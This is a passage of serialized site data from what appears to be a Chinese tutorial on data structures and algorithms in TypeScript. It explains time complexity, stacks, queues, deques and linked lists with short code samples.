+ 1]) {\n                swap(array, j, j + 1);\n                hasswap = true;\n            }\n        }\n        /*\n            如果某一轮里没有冒泡交换过，代表已经提前排好顺序了。\n            这是冒泡排序最好复杂度为o(n)的原因，其他情况是o(n^2)\n        */\n        if (!hasswap) {\n            break;\n        }\n    }\n    return array;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n4.o(log(n))：常用于while循环和递归，条件跟n有关。\n\n// 二分搜索，每次取一个中间值与目标值对比。\n// 2^x=n，对2进行x次方才能完成n项的搜索，即对数log(n)，底数是2\nfunction binarysearch<t>(array: t[], value: t): number {\n    let low: number = 0;\n    let high: number = sortedarray.length - 1;\n    // low大于high才停止搜索\n    while (low <= high) {\n        // 每次取中间数，大概2^x完成这n项的搜索\n        const mid = low + math.floor((high - low) / 2);\n        const midvalue = sortedarray[mid];\n        if (value < midvalue) {\n            high = mid - 1;\n        } else if (value > midvalue) {\n            low = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n4.o(nlog(n))：常用于一层n次循环套上while循环或递归，例如常见的归并排序和快速排序。代码较多就不展开了，具体是具体章节查看。\n\n\n# 时间复杂度的比较\n\n    在这网站https://www.bigocheatsheet.com/可以看到相关信息。\n\n\n补充一个图的时间复杂度表：\n\n\n\n\n补充一个搜索算法的最差时间复杂度表：\n\n",charsets:{cjk:!0}},{title:"2.栈",frontmatter:{title:"2.栈"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/2.%E6%A0%88.html",relativePath:"book-web/数据结构与算法/2.栈.md",key:"v-55500e3a",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/2.%E6%A0%88.html",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:8},{level:3,title:"数组",slug:"数组",normalizedTitle:"数组",charIndex:15},{level:3,title:"线性表",slug:"线性表",normalizedTitle:"线性表",charIndex:123},{level:2,title:"栈数据结构",slug:"栈数据结构",normalizedTitle:"栈数据结构",charIndex:246},{level:2,title:"基于数组的栈",slug:"基于数组的栈",normalizedTitle:"基于数组的栈",charIndex:420},{level:2,title:"基于对象的栈",slug:"基于对象的栈",normalizedTitle:"基于对象的栈",charIndex:529},{level:2,title:"保护数据结构内部元素",slug:"保护数据结构内部元素",normalizedTitle:"保护数据结构内部元素",charIndex:1282},{level:2,title:"用栈解决问题",slug:"用栈解决问题",normalizedTitle:"用栈解决问题",charIndex:2028},{level:3,title:"从十进制转换为二进制或任意进制",slug:"从十进制转换为二进制或任意进制",normalizedTitle:"从十进制转换为二进制或任意进制",charIndex:2039},{level:3,title:"平衡圆括号",slug:"平衡圆括号",normalizedTitle:"平衡圆括号",charIndex:2212},{level:3,title:"汉诺塔",slug:"汉诺塔",normalizedTitle:"汉诺塔",charIndex:2335}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"背景 数组 线性表 栈数据结构 基于数组的栈 基于对象的栈 保护数据结构内部元素 用栈解决问题 从十进制转换为二进制或任意进制 平衡圆括号 汉诺塔",content:"# 栈\n\n\n# 背景\n\n\n# 数组\n\n    数组(Array)是一种聚合数据类型，它可以将若干变量有序地组织在一起。数组还可以有一维、二维以及多维等表现形式。（在JavaScript或TypeScript有现有的数组，不用再自己实现）\n\n\n# 线性表\n\n    线性表(LinearList)是一种具有线性结构的有限序列。也就是说它的数据元素都是首尾相接的，依次形成一对一的关系。（例如栈、队列、链表等都是线性结构。在这里也不去实现线性表了，后面会去实现栈、队列、链表等数据结构）\n\n\n# 栈数据结构\n\n    栈(Stack)是一种遵从后进先出(LIFO)原则的受限线性表（受限表示对结点的操作受限制）。新添加或待删除的元素保存在栈的一端，这一端叫作栈顶；另一端是最先进入或者说最旧的元素，叫栈底。栈中没有数据时，称为空栈。\n    栈的例子有很多，例如一摞书、餐厅里的盘子、编译器和内存中保存的变量和方法等、浏览器历史记录。\n\n\n# 基于数组的栈\n\n    基于数组的栈代码细节：stack-array.ts\n\n    1.声明一个私有变量_items，类型为数组（用数组来保存栈里的元素，一维的数组也是线性结构特性），在下一节会介绍使用对象来保存栈（基于对象的栈）。\n    2.栈的后进先出实现：用数组原生方法push和pop。（在实现栈时你也可以只用数组的unshift和shift方法，只要保证在一端进行操作）\n    3.再提供一些栈常用的方法，例如：\n        peek查看栈顶元素（相当于查看数组的最后一项）\n        isEmpty栈是否为空（相当于判断数组是否为空）\n        size栈的大小（相当于查看数组的大小）\n        clear清空栈（相当于把数组置空）\n        toString返回栈的字符串形式（返回数组的字符串形式）\n\n\n# 基于对象的栈\n\n    基于对象的栈代码细节：stack-object.ts\n\n    在处理大量数据的时候，需要评估方法的时间复杂度。而使用数组时，大部分方法的时间复杂度是O(n)。还有一点就是数组是元素的一个有序集合，要保证元素排列有序，它会占用更多的内存空间。\n    而对象的使用，可以根据属性名直接获取元素，占用的内存空间也较少，也能保证一定的顺序。\n\n    1.同样声明一个私有变量_items，但类型选用对象；再声明一个私有变量_count，用来记录栈的大小并且用来作为属性名。（用对象和count作为属性也能形成线性结构特性）\n\n    2.栈的后进先出实现：\n        入栈：_count作为属性名将其添加到对象里，_count也要更新值（_count ++）\n        出栈：要删除对象最后一个属性（使用delelte运算符），并将_count更新值（_count --）\n\n    3.栈其他常用方法同上一节类似，只有一个toString方法实现需要遍历对象得到每个元素再使用toString最后将这些字符串连接起来。\n\n\n# 保护数据结构内部元素\n\n    我们实现的Stack中声明的私有属性其实并不是真正意义上的私有属性，在js层面上它是基于原型的类还是可以通过一定的方法（getOwnPropertyNames）改变它（其实tslint可以辅助开发者，提示他不要修改私有变量_items）。\n\n    1.下划线命名约定（上面用过）\n\n    2.使用ES6限定作用域Symbol\n    （这个方法其实也不行，用getOwnPropertySymbols可以拿到私有属性）\n\nconst _items = Symbol('stackItems');\nclass Stack {\n    constructor() {\n        this[_items] = [];\n    }\n    // 每次操作时用this[_items]替换this._items\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    3.使用ES6的WeakMap\n    （这个方法其实可以，就是可读性差了一些）\n\nclass Stack {\n    private _items = new WeakMap();\n    constructor() {\n        this._items.set(this, []);\n    }\n    // 每次操作时需要this._items.get(this);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    4.ECMAScript类属性提案\n    （用#号作为前缀来声明私有属性，这是在JavaScript类中增加私有属性的提案，暂时使用不了）\n\nclass Stack {\n    #count = 0;\n    #items = {};\n}\n\n\n1\n2\n3\n4\n\n\n\n# 用栈解决问题\n\n\n# 从十进制转换为二进制或任意进制\n\n    从十进制转换为二进制或任意进制代码细节：base-converter.ts\n\n    将十进制数除以2，余数作为二进制的低位，保留商，再对商进行同样的操作（余数放到上一个位置稍高的位置）直到余数为0。用栈的方式去存储的话，就是把每个余数推入栈里，最后从栈里取出每个数用字符串连起来就是二进制了。\n\n\n# 平衡圆括号\n\n    平衡圆括号代码细节：balanced-symbols.ts\n\n    将字符串里的左括号存进栈结构里，遍历到右括号时与栈顶元素相匹配，栈为空或者匹配不成功就判为false，否则遍历完所有都匹配就认为这是平衡的圆括号\n\n\n# 汉诺塔\n\n    汉诺塔代码细节\n\n    汉诺塔问题：\n\n * 有三根柱子，第一根柱子放有从下往上按大小顺序摆放的圆盘，第二个柱子是临时存放点，第三根柱子是目的点。\n * 需要把所有的圆盘从第一根柱子移动到第三根柱子，规定在小圆盘上不能放大圆盘并且在三根柱子之间一次只能移动一个圆盘。\n\n    思路：\n\n * 假如有n个盘子，我们可以分解成三个大步骤：想办法将最上面的n-1个盘子放到临时点b处，然后将最底下的最大的盘子从源地点a移到目标地点c处，最后想办法将临时点b处的n个盘子移到目标地点c处。(用3个或者4个盘子移动可以验证)\n * 仔细想一下，将最上面的n-1个盘子放到临时点b处是不是可以理解为，b作为终点c作为临时点，n-1个盘子根据汉诺塔规则从a移动到b；而将临时点b处的n个盘子移到目标地点c处是不是可以理解为，b作为源地点a作为临时点，n-1个盘子根据汉诺塔规则从b移动到c。\n * 总的来说就是两个递归加一个a到c的移动",normalizedContent:"# 栈\n\n\n# 背景\n\n\n# 数组\n\n    数组(array)是一种聚合数据类型，它可以将若干变量有序地组织在一起。数组还可以有一维、二维以及多维等表现形式。（在javascript或typescript有现有的数组，不用再自己实现）\n\n\n# 线性表\n\n    线性表(linearlist)是一种具有线性结构的有限序列。也就是说它的数据元素都是首尾相接的，依次形成一对一的关系。（例如栈、队列、链表等都是线性结构。在这里也不去实现线性表了，后面会去实现栈、队列、链表等数据结构）\n\n\n# 栈数据结构\n\n    栈(stack)是一种遵从后进先出(lifo)原则的受限线性表（受限表示对结点的操作受限制）。新添加或待删除的元素保存在栈的一端，这一端叫作栈顶；另一端是最先进入或者说最旧的元素，叫栈底。栈中没有数据时，称为空栈。\n    栈的例子有很多，例如一摞书、餐厅里的盘子、编译器和内存中保存的变量和方法等、浏览器历史记录。\n\n\n# 基于数组的栈\n\n    基于数组的栈代码细节：stack-array.ts\n\n    1.声明一个私有变量_items，类型为数组（用数组来保存栈里的元素，一维的数组也是线性结构特性），在下一节会介绍使用对象来保存栈（基于对象的栈）。\n    2.栈的后进先出实现：用数组原生方法push和pop。（在实现栈时你也可以只用数组的unshift和shift方法，只要保证在一端进行操作）\n    3.再提供一些栈常用的方法，例如：\n        peek查看栈顶元素（相当于查看数组的最后一项）\n        isempty栈是否为空（相当于判断数组是否为空）\n        size栈的大小（相当于查看数组的大小）\n        clear清空栈（相当于把数组置空）\n        tostring返回栈的字符串形式（返回数组的字符串形式）\n\n\n# 基于对象的栈\n\n    基于对象的栈代码细节：stack-object.ts\n\n    在处理大量数据的时候，需要评估方法的时间复杂度。而使用数组时，大部分方法的时间复杂度是o(n)。还有一点就是数组是元素的一个有序集合，要保证元素排列有序，它会占用更多的内存空间。\n    而对象的使用，可以根据属性名直接获取元素，占用的内存空间也较少，也能保证一定的顺序。\n\n    1.同样声明一个私有变量_items，但类型选用对象；再声明一个私有变量_count，用来记录栈的大小并且用来作为属性名。（用对象和count作为属性也能形成线性结构特性）\n\n    2.栈的后进先出实现：\n        入栈：_count作为属性名将其添加到对象里，_count也要更新值（_count ++）\n        出栈：要删除对象最后一个属性（使用delelte运算符），并将_count更新值（_count --）\n\n    3.栈其他常用方法同上一节类似，只有一个tostring方法实现需要遍历对象得到每个元素再使用tostring最后将这些字符串连接起来。\n\n\n# 保护数据结构内部元素\n\n    我们实现的stack中声明的私有属性其实并不是真正意义上的私有属性，在js层面上它是基于原型的类还是可以通过一定的方法（getownpropertynames）改变它（其实tslint可以辅助开发者，提示他不要修改私有变量_items）。\n\n    1.下划线命名约定（上面用过）\n\n    2.使用es6限定作用域symbol\n    （这个方法其实也不行，用getownpropertysymbols可以拿到私有属性）\n\nconst _items = symbol('stackitems');\nclass stack {\n    constructor() {\n        this[_items] = [];\n    }\n    // 每次操作时用this[_items]替换this._items\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    3.使用es6的weakmap\n    （这个方法其实可以，就是可读性差了一些）\n\nclass stack {\n    private _items = new weakmap();\n    constructor() {\n        this._items.set(this, []);\n    }\n    // 每次操作时需要this._items.get(this);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    4.ecmascript类属性提案\n    （用#号作为前缀来声明私有属性，这是在javascript类中增加私有属性的提案，暂时使用不了）\n\nclass stack {\n    #count = 0;\n    #items = {};\n}\n\n\n1\n2\n3\n4\n\n\n\n# 用栈解决问题\n\n\n# 从十进制转换为二进制或任意进制\n\n    从十进制转换为二进制或任意进制代码细节：base-converter.ts\n\n    将十进制数除以2，余数作为二进制的低位，保留商，再对商进行同样的操作（余数放到上一个位置稍高的位置）直到余数为0。用栈的方式去存储的话，就是把每个余数推入栈里，最后从栈里取出每个数用字符串连起来就是二进制了。\n\n\n# 平衡圆括号\n\n    平衡圆括号代码细节：balanced-symbols.ts\n\n    将字符串里的左括号存进栈结构里，遍历到右括号时与栈顶元素相匹配，栈为空或者匹配不成功就判为false，否则遍历完所有都匹配就认为这是平衡的圆括号\n\n\n# 汉诺塔\n\n    汉诺塔代码细节\n\n    汉诺塔问题：\n\n * 有三根柱子，第一根柱子放有从下往上按大小顺序摆放的圆盘，第二个柱子是临时存放点，第三根柱子是目的点。\n * 需要把所有的圆盘从第一根柱子移动到第三根柱子，规定在小圆盘上不能放大圆盘并且在三根柱子之间一次只能移动一个圆盘。\n\n    思路：\n\n * 假如有n个盘子，我们可以分解成三个大步骤：想办法将最上面的n-1个盘子放到临时点b处，然后将最底下的最大的盘子从源地点a移到目标地点c处，最后想办法将临时点b处的n个盘子移到目标地点c处。(用3个或者4个盘子移动可以验证)\n * 仔细想一下，将最上面的n-1个盘子放到临时点b处是不是可以理解为，b作为终点c作为临时点，n-1个盘子根据汉诺塔规则从a移动到b；而将临时点b处的n个盘子移到目标地点c处是不是可以理解为，b作为源地点a作为临时点，n-1个盘子根据汉诺塔规则从b移动到c。\n * 总的来说就是两个递归加一个a到c的移动",charsets:{cjk:!0}},{title:"3.队列",frontmatter:{title:"3.队列"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/3.%E9%98%9F%E5%88%97.html",relativePath:"book-web/数据结构与算法/3.队列.md",key:"v-add73d44",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/3.%E9%98%9F%E5%88%97.html",headers:[{level:2,title:"队列数据结构",slug:"队列数据结构",normalizedTitle:"队列数据结构",charIndex:9},{level:2,title:"队列实现",slug:"队列实现",normalizedTitle:"队列实现",charIndex:165},{level:2,title:"双端队列数据结构",slug:"双端队列数据结构",normalizedTitle:"双端队列数据结构",charIndex:671},{level:2,title:"双端队列实现",slug:"双端队列实现",normalizedTitle:"双端队列实现",charIndex:767},{level:2,title:"循环队列",slug:"循环队列",normalizedTitle:"循环队列",charIndex:1541},{level:2,title:"回文检查器",slug:"回文检查器",normalizedTitle:"回文检查器",charIndex:1704},{level:2,title:"JavaScript任务队列",slug:"javascript任务队列",normalizedTitle:"javascript任务队列",charIndex:1875}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"队列数据结构 队列实现 双端队列数据结构 双端队列实现 循环队列 回文检查器 JavaScript任务队列",content:"# 队列\n\n\n# 队列数据结构\n\n    队列(queue)是一种遵从先进先出(FIFO)原则的受限线性表（受限表示对结点的操作受限制）。新添加的元素在队列尾部（只能添加不能删除），待删除的元素在队列的首部（只能删除不能添加）。队列中没有元素时，称为空队列。\n    队列的例子有很多，例如单向通道，打印机的打印队列等。\n\n\n# 队列实现\n\n    队列实现代码细节：queue.ts\n\n    1.声明一个私有变量_items用于存储元素，类型跟stack一样选用对象；再声明一个私有变量_count用于记录队列的数量；最后声明一个私有变量_lowestIndex，用于记录下一个进来的元素即将使用的下标。\n\n    2.队列的先进先出实现：\n        新增尾部元素跟stack类似要用下标作为属性名，但这里用_lowestIndex作为属性名（可以思考一下为什么不用_count），添加到对象中后更新_count和_lowestIndex的值。\n        删除首部元素跟stack类似用delete运算符，但我们要在首部删除，所以拿到首部元素的下标也就是_lowestIndex减去_count所得的值，然后使用delete删除首部元素，最后更新_count的值（_lowestIndex不用更新，它不会受影响）。\n\n    3.队列的其他常用方法跟stack的其他常用方法实现类似。peek查看队列首部元素、isEmpty队列是否为空、size队列的大小、clear清空队列、toString返回队列的字符串形式。\n\n\n# 双端队列数据结构\n\n    双端队列(deque)是一种允许我们同时从首部和尾部添加和移除元素的特殊队列。\n    双端队列的例子有很多，例如餐厅或者电影院排队，软件中的撤销功能等。\n\n\n# 双端队列实现\n\n    双端队列实现代码细节：deque.ts\n\n    1.声明一个私有变量_items用于存储元素，类型跟stack一样选用对象；再声明一个私有变量_count用于记录队列的数量；最后声明一个私有变量_lowestIndex，用于记录下一个进来的元素即将使用的下标。（跟queue一样）\n\n    2.双端队列的双端删除和添加：         尾部添加新元素addBack：跟队列一样的做法，在对象里插入属性名为_lowestIndex的新元素，再更新_lowestIndex和_count。\n        首端添加元素addFront：要分三种情况，1队列为空那么直接往尾部添加新元素也就是调用addBack；2首部元素的下标为0那么要先将队列的元素集体右移再将新元素添加到下标为0的位置，更新_lowestIndex和_count；3首部元素的下标不为0那么将新元素添加到首部元素的前一位，更新_count。\n        移除尾部元素removeBack：先拿到尾部元素的下标也就是_lowestIndex减去1所得的值，再用delete删除尾部元素，最后更新_count和_lowestIndex。\n        移除首部元素removeFront：先拿到首部元素的下标也就是_lowestIndex减去_count所得的值，再用delete删除首部元素，最后更新_count（_lowestIndex不用更新，它不会受影响）。\n\n    3.双端队列的其他常用方法跟queue的其他常用方法实现类似。peekFront查看双端队列首部元素、peekBack查看双端队列尾部元素、isEmpty双端队列是否为空、size双端队列的大小、clear清空双端队列、toString返回双端队列的字符串形式。\n\n\n# 循环队列\n\n    循环队列实现代码细节：hot-potato.ts\n\n    击鼓传花思路：先构造一个队列（当然如果是双向的问题就用双端队列），将首部元素拿掉放到尾部重复num次，这num次算一轮，每轮结束将首部拿出存到临时数组里，继续循环每一轮直到剩余最后一项终止。最后一项就是胜利者，临时数组就是每轮的淘汰者。\n\n\n# 回文检查器\n\n    回文检查器实现代码细节：palindrome-checker.ts\n\n> 回文是正反都能读通的单词、词组、数或一系列字符的序列，例如madam或racecar。\n\n    思路：字符串反转、栈存储一半字符等都可以解决，这里用双端队列来解决。先将目标字符串构造成一个双端队列，然后每次都从首部和尾部取出元素对比。\n\n\n# JavaScript任务队列\n\n> 当我们在浏览器中打开新标签时，就会创建一个任务队列。这是因为每个标签都是单线程处理所有的任务，称为事件循环。浏览器要负责做个任务，如渲染HTML、执行JavaScript代码、处理用户交互（用户输入、鼠标点击等）、执行和处理异步请求。 https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/ 翻译文https://segmentfault.com/a/1190000014812771?utm_source=channel-hottest",normalizedContent:"# 队列\n\n\n# 队列数据结构\n\n    队列(queue)是一种遵从先进先出(fifo)原则的受限线性表（受限表示对结点的操作受限制）。新添加的元素在队列尾部（只能添加不能删除），待删除的元素在队列的首部（只能删除不能添加）。队列中没有元素时，称为空队列。\n    队列的例子有很多，例如单向通道，打印机的打印队列等。\n\n\n# 队列实现\n\n    队列实现代码细节：queue.ts\n\n    1.声明一个私有变量_items用于存储元素，类型跟stack一样选用对象；再声明一个私有变量_count用于记录队列的数量；最后声明一个私有变量_lowestindex，用于记录下一个进来的元素即将使用的下标。\n\n    2.队列的先进先出实现：\n        新增尾部元素跟stack类似要用下标作为属性名，但这里用_lowestindex作为属性名（可以思考一下为什么不用_count），添加到对象中后更新_count和_lowestindex的值。\n        删除首部元素跟stack类似用delete运算符，但我们要在首部删除，所以拿到首部元素的下标也就是_lowestindex减去_count所得的值，然后使用delete删除首部元素，最后更新_count的值（_lowestindex不用更新，它不会受影响）。\n\n    3.队列的其他常用方法跟stack的其他常用方法实现类似。peek查看队列首部元素、isempty队列是否为空、size队列的大小、clear清空队列、tostring返回队列的字符串形式。\n\n\n# 双端队列数据结构\n\n    双端队列(deque)是一种允许我们同时从首部和尾部添加和移除元素的特殊队列。\n    双端队列的例子有很多，例如餐厅或者电影院排队，软件中的撤销功能等。\n\n\n# 双端队列实现\n\n    双端队列实现代码细节：deque.ts\n\n    1.声明一个私有变量_items用于存储元素，类型跟stack一样选用对象；再声明一个私有变量_count用于记录队列的数量；最后声明一个私有变量_lowestindex，用于记录下一个进来的元素即将使用的下标。（跟queue一样）\n\n    2.双端队列的双端删除和添加：         尾部添加新元素addback：跟队列一样的做法，在对象里插入属性名为_lowestindex的新元素，再更新_lowestindex和_count。\n        首端添加元素addfront：要分三种情况，1队列为空那么直接往尾部添加新元素也就是调用addback；2首部元素的下标为0那么要先将队列的元素集体右移再将新元素添加到下标为0的位置，更新_lowestindex和_count；3首部元素的下标不为0那么将新元素添加到首部元素的前一位，更新_count。\n        移除尾部元素removeback：先拿到尾部元素的下标也就是_lowestindex减去1所得的值，再用delete删除尾部元素，最后更新_count和_lowestindex。\n        移除首部元素removefront：先拿到首部元素的下标也就是_lowestindex减去_count所得的值，再用delete删除首部元素，最后更新_count（_lowestindex不用更新，它不会受影响）。\n\n    3.双端队列的其他常用方法跟queue的其他常用方法实现类似。peekfront查看双端队列首部元素、peekback查看双端队列尾部元素、isempty双端队列是否为空、size双端队列的大小、clear清空双端队列、tostring返回双端队列的字符串形式。\n\n\n# 循环队列\n\n    循环队列实现代码细节：hot-potato.ts\n\n    击鼓传花思路：先构造一个队列（当然如果是双向的问题就用双端队列），将首部元素拿掉放到尾部重复num次，这num次算一轮，每轮结束将首部拿出存到临时数组里，继续循环每一轮直到剩余最后一项终止。最后一项就是胜利者，临时数组就是每轮的淘汰者。\n\n\n# 回文检查器\n\n    回文检查器实现代码细节：palindrome-checker.ts\n\n> 回文是正反都能读通的单词、词组、数或一系列字符的序列，例如madam或racecar。\n\n    思路：字符串反转、栈存储一半字符等都可以解决，这里用双端队列来解决。先将目标字符串构造成一个双端队列，然后每次都从首部和尾部取出元素对比。\n\n\n# javascript任务队列\n\n> 当我们在浏览器中打开新标签时，就会创建一个任务队列。这是因为每个标签都是单线程处理所有的任务，称为事件循环。浏览器要负责做个任务，如渲染html、执行javascript代码、处理用户交互（用户输入、鼠标点击等）、执行和处理异步请求。 https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/ 翻译文https://segmentfault.com/a/1190000014812771?utm_source=channel-hottest",charsets:{cjk:!0}},{title:"4.链表",frontmatter:{title:"4.链表"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/4.%E9%93%BE%E8%A1%A8.html",relativePath:"book-web/数据结构与算法/4.链表.md",key:"v-5c3f25c2",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/4.%E9%93%BE%E8%A1%A8.html",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:9},{level:2,title:"链表数据结构",slug:"链表数据结构",normalizedTitle:"链表数据结构",charIndex:184},{level:2,title:"栈、队列与链表的区别",slug:"栈、队列与链表的区别",normalizedTitle:"栈、队列与链表的区别",charIndex:405},{level:2,title:"链表的实现",slug:"链表的实现",normalizedTitle:"链表的实现",charIndex:615},{level:2,title:"双向链表数据结构",slug:"双向链表数据结构",normalizedTitle:"双向链表数据结构",charIndex:1698},{level:2,title:"双向链表的实现",slug:"双向链表的实现",normalizedTitle:"双向链表的实现",charIndex:1827},{level:2,title:"循环链表数据结构",slug:"循环链表数据结构",normalizedTitle:"循环链表数据结构",charIndex:3240},{level:2,title:"循环链表的实现",slug:"循环链表的实现",normalizedTitle:"循环链表的实现",charIndex:3296},{level:2,title:"双向循环链表数据结构",slug:"双向循环链表数据结构",normalizedTitle:"双向循环链表数据结构",charIndex:3521},{level:2,title:"双向循环链表的实现",slug:"双向循环链表的实现",normalizedTitle:"双向循环链表的实现",charIndex:3593},{level:2,title:"有序链表数据结构",slug:"有序链表数据结构",normalizedTitle:"有序链表数据结构",charIndex:3846},{level:2,title:"有序链表的实现",slug:"有序链表的实现",normalizedTitle:"有序链表的实现",charIndex:3929},{level:2,title:"基于双向链表的栈数据结构",slug:"基于双向链表的栈数据结构",normalizedTitle:"基于双向链表的栈数据结构",charIndex:4251},{level:2,title:"基于双向链表的栈的实现",slug:"基于双向链表的栈的实现",normalizedTitle:"基于双向链表的栈的实现",charIndex:4316}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"背景 链表数据结构 栈、队列与链表的区别 链表的实现 双向链表数据结构 双向链表的实现 循环链表数据结构 循环链表的实现 双向循环链表数据结构 双向循环链表的实现 有序链表数据结构 有序链表的实现 基于双向链表的栈数据结构 基于双向链表的栈的实现",content:"# 链表\n\n\n# 背景\n\n> 要存储多个元素，数组（或列表）可能是最常用的数据结构。它非常方便，提供了[]语法来访问其元素。但它有个缺点：（在大多数语言中）数组的大小是固定的，并且从数组的起点或中间插入或移除项的成本很高，因为需要移动元素。（尽管有来自Array类方法可以帮助我们做这些事，但背后的情况同样如此）——《学习JavaScript数据结构与算法》\n\n\n# 链表数据结构\n\n    链表(LinkedList)是一个数据元素按照链式存储结构进行存储的并且逻辑结构上符合一般线性表特性的数据结构。它的数据元素由一个存储元素本身的节点和一个指向下一个元素的引用（指针）组成的（因此形成了元素之间的一对一的关系，也就是线性结构特性）。\n\n    它相对于数组的好处是，添加或移除元素的时候不需要移动其他元素。但是链表需要使用指针，并且访问链表中的元素需要从起点（链表首部）开始迭代至你需要的元素。\n\n\n# 栈、队列与链表的区别\n\n    在逻辑结构上，他们都具有线性结构也就是线性表的特性（有唯一的前驱和后继），栈和队列属于受限线性表（受限表示对结点的操作受限制），而链表属于一般线性表（也就是不受限）。\n    在存储结构上，栈和队列是顺序存储结构，也就是用一组地址连续的存储单元依次存储线性表中的数据元素；而链表就不一样了，它是链式存储结构，也就是用一组任意的存储单元存储线性表中的数据元素（可连续也可不连续）。\n\n\n# 链表的实现\n\n    链表的实现代码细节：linked-list.ts\n\n    1.需要准备一个助手类Node，这个助手类有两个属性，一个是本身的值，另一个是指向下一个Node的指针。\n\n    2.声明一个protected级别的变量head，用于追踪首部元素；声明一个count用于记录链表的大小；声明一个equalsFn，保存实例化时传来的“比较函数”。\n\n    3.返回链表中特定位置的元素getElementAt：\n        从head首部元素开始向后遍历，直到遍历到指定位置就返回这个位置的项，当然如果当前项是空的自然就中断遍历返回空结果。\n\n    4.返回元素在链表中的索引indexOf：\n        从head首部元素开始向后遍历，直到当前项与目标项通过equalsFn对比结果为相同时结束遍历并返回当前项的索引，遍历完都没找到相同的话就返回-1，当然如果当前项是空的自然就中断遍历返回-1。\n\n    5.往链表尾部添加元素push：\n        链表为空时，添加的新元素就是head首部元素；链表不为空时，需要将新元素追加到尾部，用迭代的方式（getElementAt方法）拿到尾部元素（node.next为空时代表node就是尾部元素）。最后记得更新count的值。\n\n    6.从链表中移除元素removeAt：\n        和push类似，当链表只有一个元素时只需把head清空；当链表元素多于一个时，需要迭代（getElementAt方法）到指定位置再将其移除，移除后还要把它的next与它的上一个位置连接起来，保证移除一个元素后链表是完整的。\n        扩展：用indexOf和removeAt配合可以组成新的移除方法，就是移除与指定项相同的元素（目前只能移除一个）。\n\n    7.往链表首部添加元素unshift：\n        链表为空时，添加的新元素就是head首部元素；链表不为空时，需要将新元素的next指向head，然后再把新元素赋给head以完成新元素与链表的连接。最后记得更新count的值。\n\n    8.往链表中特定位置插入一个新元素insert：\n        要放到第一个位置时，其实就是调用unshift；其他情况，需要拿到指定位置的前一个位置的元素，并把这个元素的next赋给新元素，再让这个元素的next指向新元素，以完成链表的连接。最后记得更新count的值。\n\n    9.链表的其他方法isEmpty、size、clear、toString很好实现。\n\n\n# 双向链表数据结构\n\n    双向链表(DoublyLinkedList)是一个特殊的链表。区别就是它的数据元素由一个存储元素本身的节点、一个指向下一个元素的引用、一个指向上一个元素的引用组成的。也就是说双向链表拥有双向的引用，而链表拥有单向的引用。\n\n\n# 双向链表的实现\n\n    双向链表的实现代码细节：doubly-linked-list.ts\n\n    1.我们需要准备一个跟Node不一样的助手类DoublyNode，这个助手类有三个属性，一个是本身的值，另一个是指向下一个DoublyNode的指针，最后一个是指向上一个DoublyNode的指针。\n\n    2.我们让DoublyLinkedList继承LinkedList，可以使用父类的方法和属性。声明两个属性，head指向首部元素（第一个），tail指向尾部元素（最后一个），记得类型得是DoublyNode，其他的同LinkedList。\n\n    3.往双向链表尾部添加元素push：\n        链表为空时，将新元素赋给head和tail；链表不为空时，需要将新元素追加到尾部，也就是将新元素的next指向tail的next，新元素的prev指向tail，但此时的链表还没指向新元素，那么就让tail的next指向新元素，最后把tail更新也就是把新元素赋给tail（这四个步骤要仔细理清楚）。最后记得更新count的值。\n\n    4.往双向链表首部添加元素unshift：\n        链表为空时，将新元素赋给head和tail；链表不为空时，需要将新元素追加到首部，也就是将新元素的prev指向head的prev，新元素的next指向head，但此时的链表还没指向新元素，那么就让head的prev指向新元素，最后把head更新也就是把新元素赋给head（这四个步骤有个别顺序不能打乱，自己理一理）。最后记得更新count的值。\n\n    5.在双向链表的任意位置插入新元素insert：\n        当要插入的位置是第一个位置或者最后一个位置，相当于调用unshift或push方法；其他场景，需要拿到指定位置的前一个位置的元素，然后把新元素连接到刚刚这元素后面，再更新一些引用（指针），例如：新元素的next要指向刚刚这元素的next，新元素的next的prev要指向新元素，新元素的prev要指向刚刚这元素，刚刚这元素的next要指向新元素（比起unshift和push要复杂，理清楚就好了）。最后记得更新count的值。\n\n    6.从双向链表中移除元素removeAt：\n        当链表只有一个元素时只需把head和tail清空；当移除的是首部元素时，需要将head指向head的next，再把head的prev置空即可；当移除的是尾部元素时，需要将tail指向tail的prev，再把tail的next置空即可；需要迭代（getElementAt方法）到指定位置，再把这个位置的prev的next指向这个位置的next，再把这个位置的next的prev指向这个位置的prev，这样就可以把这个位置上的元素从双向链表中移除。\n        扩展：用indexOf和removeAt配合可以组成新的移除方法，就是移除与指定项相同的元素（目前只能移除一个）。\n\n    